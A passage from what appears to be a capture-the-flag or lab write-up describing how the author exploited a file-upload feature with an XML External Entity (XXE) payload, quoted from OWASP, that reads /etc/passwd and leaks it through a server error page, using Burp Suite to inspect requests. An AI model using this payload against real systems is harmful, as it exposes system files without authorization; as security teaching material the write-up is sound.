    src="https://github.com/user-attachments/assets/857ea0e4-c014-43b4-b01f-af9427ebadbe"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

The reponse looked promising, but still the content of `/etc/passwd` had not been leaked. For now I abandoned the SVG appraoch and started googling different payloads. At the same time, I wondered whether perhaps I was just getting the `Content-Type` or file extension wrong the whole time. So instead of intercepting a request and *then* modifying it, I decided to try to upload an XML-file right away (the file-upload mechanism seemed broken anyway, so why not try?). I found the following (slightly more straightforward) payload [here](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) and simply created `file.xml` containing this snippet:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

I uploaded this file as a complaint and intercepted the request in Burp Suite. Indeed, the `Content-Type` was different from earlier, and more importantly the server did not complain about the `.xml` extension. The request was processed as before, except that the error page contained the content of `/etc/passwd` this time!

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/1b108cb9-e18c-4ba8-a8e7-35ed0b8ac7d8"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/8f87d6fb-862b-4df2-9a06-b1a963eb3ecb"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>
























